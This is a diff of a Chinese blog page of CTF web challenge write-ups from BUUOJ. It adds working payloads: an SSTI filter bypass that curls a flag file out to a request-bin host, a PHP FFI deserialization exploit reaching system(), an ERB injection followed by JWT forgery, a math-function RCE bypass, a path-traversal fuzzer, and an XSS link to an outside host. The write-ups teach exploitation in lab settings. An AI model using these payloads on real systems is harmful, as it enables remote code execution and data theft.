@@ -35,7 +35,8 @@
     <!-- rss -->
     
     
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -89,7 +90,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [WUSTCTF2020]Train Yourself To Be Godly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-WUSTCTF2020-easyweb"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [WUSTCTF2020]easyweb</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [WUSTCTF2020]Train Yourself To Be Godly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-WUSTCTF2020-easyweb"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [WUSTCTF2020]easyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GWCTF-2019-你的名字"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [GWCTF 2019]你的名字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-RCTF-2019-Nextphp"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [RCTF 2019]Nextphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-SCTF2019-Flag-Shop"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [SCTF2019]Flag Shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-NESTCTF-2019-Love-Math-2"><span class="toc-number">7.</span> <span class="toc-text">0x 07 [NESTCTF 2019]Love Math 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-Zer0pts2020-Can-you-guess-it"><span class="toc-number">8.</span> <span class="toc-text">0x 08 [Zer0pts2020]Can you guess it?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-09-Zer0pts2020-musicblog"><span class="toc-number">9.</span> <span class="toc-text">0x 09 [Zer0pts2020]musicblog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-10-安洵杯-2019-cssgame"><span class="toc-number">10.</span> <span class="toc-text">0x 10 [安洵杯 2019]cssgame</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -115,7 +116,7 @@
       
         <time datetime="2020-04-01T14:00:37.000Z" itemprop="datePublished">2020-04-01</time>
         
-        (Updated: <time datetime="2020-04-03T14:15:51.262Z" itemprop="dateModified">2020-04-03</time>)
+        (Updated: <time datetime="2020-04-21T14:58:02.736Z" itemprop="dateModified">2020-04-21</time>)
         
       
     </div>
@@ -220,6 +221,194 @@
 <p><a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2176.html#easyweb</a></p>
 <p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves</a></p>
 </blockquote>
+<h3 id="0x-04-GWCTF-2019-你的名字"><a href="#0x-04-GWCTF-2019-你的名字" class="headerlink" title="0x 04 [GWCTF 2019]你的名字"></a>0x 04 [GWCTF 2019]你的名字</h3><ul>
+<li><p>考点</p>
+<p>ssti bypass</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>经过fuzz,后台强过滤匹配<code></code>，这里可以用if语句绕过。黑名单过滤如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist &#x3D; [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;if&#39;, &#39;for&#39;,</span><br><span class="line">                 &#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;, &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,</span><br><span class="line">                 &#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]</span><br><span class="line">for no in blacklist:</span><br><span class="line">    while True:</span><br><span class="line">        if no in s:</span><br><span class="line">            s &#x3D; s.replace(no, &#39;&#39;)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">return s</span><br></pre></td></tr></table></figure>
+
+<p>这个逻辑是按顺序针对每个关键词过滤，只能应付双写绕过，可以用列表的最后一项来绕过过滤,payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl http:&#x2F;&#x2F;http.requconfigestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤之后最终的脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-05-RCTF-2019-Nextphp"><a href="#0x-05-RCTF-2019-Nextphp" class="headerlink" title="0x 05 [RCTF 2019]Nextphp"></a>0x 05 [RCTF 2019]Nextphp</h3><ul>
+<li><p>考点</p>
+<p>php7.4新版本特性</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>查看php配置信息，版本是7.4，同时发现过滤了大多数系统函数</li>
+</ol>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224651185.png" alt></p>
+<ol start="2">
+<li>没有过滤scandir函数，payload:<code>?a=var_dump(scandir(&#39;/var/www/html&#39;));</code></li>
+</ol>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224810734.png" alt></p>
+<ol start="3">
+<li>利用file_get_contents()查看preload.php源码，payload：<code>a=echo file_get_contents(&#39;preload.php&#39;);</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;print_r&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;1&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析代码是：PHP7.4新特性：新的自定义对象序列化机制：<a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">关于<strong>serialize和</strong>unserialize</a></p>
+<ol start="4">
+<li>观察代码，发现对象反序列化时会执行run()方法</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时发现可以结合__get魔法函数，获取对象data数组中的元素值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>根据题目文件名称提示关注php7.4的新特性，关于<code>opcache.preload</code>，参考这篇文章<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload</a> 可知</li>
+</ol>
+<blockquote>
+<p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> 是 <strong>PHP7.4</strong> 中新加入的功能。如果设置了 <a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> ，那么在所有Web应用程序运行之前，服务会先将设定的 <strong>preload</strong> 文件加载进内存中，使这些 <strong>preload</strong> 文件中的内容对之后的请求均可用。</p>
+</blockquote>
+<p>在这篇文档尾巴可以看到如下描述：</p>
+<blockquote>
+<p>In conjunction with ext/FFI (dangerous extension), we may allow FFI  functionality only in preloaded PHP files, but not in regular ones</p>
+</blockquote>
+<p>大概意思就是说允许在 <strong>preload</strong> 文件中使用 <strong>FFI</strong> 拓展，但是文档中说了 <strong>FFI</strong> 是一个危险的拓展，而这道题目却开启了 <strong>FFI</strong> 拓展。</p>
+<p>构造exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;FFI::cdef&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;int system(const char *command);&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<p>最终payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;$a%3dunserialize(&#39;C%3A1%3A%22A%22%3A95%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A32%3A%22int+system%28const+char+%2Acommand%29%3B%22%3B%7D%7D&#39;)-&gt;ret;var_dump($a-&gt;system(&quot;cat%20&#x2F;flag&gt;b.txt&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>最后访问b.txt得到flag</p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp</a></p>
+<p><a href="https://blog.csdn.net/qq_41809896/article/details/90384668" target="_blank" rel="noopener">https://blog.csdn.net/qq_41809896/article/details/90384668</a></p>
+<p><a href="https://cjm00n.top/CTF/buuoj-writeup-2.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/buuoj-writeup-2.html</a></p>
+</blockquote>
+<h3 id="0x-06-SCTF2019-Flag-Shop"><a href="#0x-06-SCTF2019-Flag-Shop" class="headerlink" title="0x 06 [SCTF2019]Flag Shop"></a>0x 06 [SCTF2019]Flag Shop</h3><ul>
+<li><p>考点</p>
+<p>erb模版注入</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li><p>页面打开是一个购买flag的页面，flag需要1e+27个JinKela才能购买，数量不够。访问robots.txt发现filebak目录，访问得到页面源代码</p>
+</li>
+<li><p>审计代码发现</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">get &quot;&#x2F;work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;</span><br><span class="line">  auth &#x3D; auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;</span><br><span class="line">    cookies[:auth] &#x3D; auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>如果传入的do参数和name参数一致，会输出<code>{params[:name][0,7]} working successfully!</code></p>
+<p>但是限制了只能输入7个字符，除去&lt;%==&gt;只有两个字符可以利用，这时可以利用ruby全局变量$&amp;，可以获得上一次正则匹配的结果</p>
+<p>payload：<code>/work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code></p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414232933574.png" alt></p>
+<p>成功拿到secret,接着伪造cookie</p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233126939.png" alt></p>
+<p>回到页面，buy flag，抓包将伪造的cookie写进去，在返回的包里拿到新的cookie，解密得到flag</p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233252575.png" alt></p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233323947.png" alt></p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md" target="_blank" rel="noopener">https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md</a></p>
+</blockquote>
+<h3 id="0x-07-NESTCTF-2019-Love-Math-2"><a href="#0x-07-NESTCTF-2019-Love-Math-2" class="headerlink" title="0x 07 [NESTCTF 2019]Love Math 2"></a>0x 07 [NESTCTF 2019]Love Math 2</h3><ul>
+<li><p>考点</p>
+<p>php动态特性捕捉</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload &#x3D; [‘abs‘, ‘acos‘, ‘acosh‘, ‘asin‘, ‘asinh‘, ‘atan2‘, ‘atan‘, ‘atanh‘,  ‘bindec‘, ‘ceil‘, ‘cos‘, ‘cosh‘, ‘decbin‘ , ‘decoct‘, ‘deg2rad‘, ‘exp‘, ‘expm1‘, ‘floor‘, ‘fmod‘, ‘getrandmax‘, ‘hexdec‘, ‘hypot‘, ‘is_finite‘, ‘is_infinite‘, ‘is_nan‘, ‘lcg_value‘, ‘log10‘, ‘log1p‘, ‘log‘, ‘max‘, ‘min‘, ‘mt_getrandmax‘, ‘mt_rand‘, ‘mt_srand‘, ‘octdec‘, ‘pi‘, ‘pow‘, ‘rad2deg‘, ‘rand‘, ‘round‘, ‘sin‘, ‘sinh‘, ‘sqrt‘, ‘srand‘, ‘tan‘, ‘tanh‘];</span><br><span class="line">for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j &#x3D; 0;$j &lt;&#x3D;9;$j++)&#123;</span><br><span class="line">            $exp &#x3D; $payload[$k] ^ $i.$j;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;&lt;command&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/yesec/p/12664136.html" target="_blank" rel="noopener">https://www.cnblogs.com/yesec/p/12664136.html</a></p>
+</blockquote>
+<h3 id="0x-08-Zer0pts2020-Can-you-guess-it"><a href="#0x-08-Zer0pts2020-Can-you-guess-it" class="headerlink" title="0x 08 [Zer0pts2020]Can you guess it?"></a>0x 08 [Zer0pts2020]Can you guess it?</h3><ul>
+<li><p>考点</p>
+<p>正则污染绕过、代码审计</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>打开题目访问源代码进行审计</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$_SERVER[&#39;PHP_SELF&#39;]表示当前php文件相对于网站根目录的位置地址</span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); &#x2F;&#x2F;basename() 函数返回路径中的文件名部分</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret &#x3D; bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#39;guess&#39;])) &#123;</span><br><span class="line">  $guess &#x3D; (string) $_POST[&#39;guess&#39;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message &#x3D; &#39;Wrong.&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>问题出在了basename()函数可以跨目录读取文件，但是需要绕过正则，这里可以用污染绕过，贴一下y1ng师傅的fuzz脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import requests</span><br><span class="line">for i in range (0,500):</span><br><span class="line">	url &#x3D; &#39;http:&#x2F;&#x2F;814589eb-4094-4449-bf79-39388aa86610.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;&#123;&#125;?source&#39;.format(hex(i).replace(&#39;0x&#39;, &#39;%&#39;))</span><br><span class="line">	r &#x3D; requests.get(url)</span><br><span class="line">	print(url)</span><br><span class="line">	if r&quot;flag&quot; in r.text:</span><br><span class="line">		print(r.content)</span><br></pre></td></tr></table></figure>
+
+<p>可以fuzz出很多可以用的参数</p>
+<h3 id="0x-09-Zer0pts2020-musicblog"><a href="#0x-09-Zer0pts2020-musicblog" class="headerlink" title="0x 09 [Zer0pts2020]musicblog"></a>0x 09 [Zer0pts2020]musicblog</h3><ul>
+<li><p>考点</p>
+<p>代码设计、XSS bypass</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li><p>下载题目附件进行审计，在work.js中发现存在flag且设置在浏览器UA中，后台机器人会点击<code>#like</code>标签<img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420224644867.png" alt></p>
+</li>
+<li><p>审计<code>utli.php</code>发现</p>
+</li>
+</ol>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420225324470.png" alt></p>
+<p>字符串会被加载到<code>&lt;audio&gt;</code>标签并解析到页面，输入的内容经过一次strip_tags处理。</p>
+<p>没有过滤其他内容，可以在``中插入任意内容，但是受CSP-nonce的限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$nonce &#x3D; get_nonce();</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39;; base-uri &#39;none&#39;; trusted-types&quot;);</span><br><span class="line">header(&#39;X-Frame-Options: DENY&#39;);</span><br><span class="line">header(&#39;X-XSS-Protection: 1; mode&#x3D;block&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>而这个<code>strip_tags()</code>存在bug:<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a></p>
+<p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420230614404.png" alt></p>
+<p><img src="http://static.zybuluo.com/1160307775/5vrpxpsvcopf7bucy1q2y4h1/image_1e2uhu2v810fc1l7ppa4l41mqm20.png" alt="image_1e2uhu2v810fc1l7ppa4l41mqm20.png-53.5kB"></p>
+<p>MusicBlog 中使用的是<code>&lt;audio&gt;</code>作为白名单，<code>&lt;a/udio&gt;</code>可以通过函数处理，并且<code>&lt;a/udio&gt;</code>会作为 超链接<code>&lt;a&gt;</code>被解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>经过处理后展开是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls src&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog" target="_blank" rel="noopener">https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog</a></p>
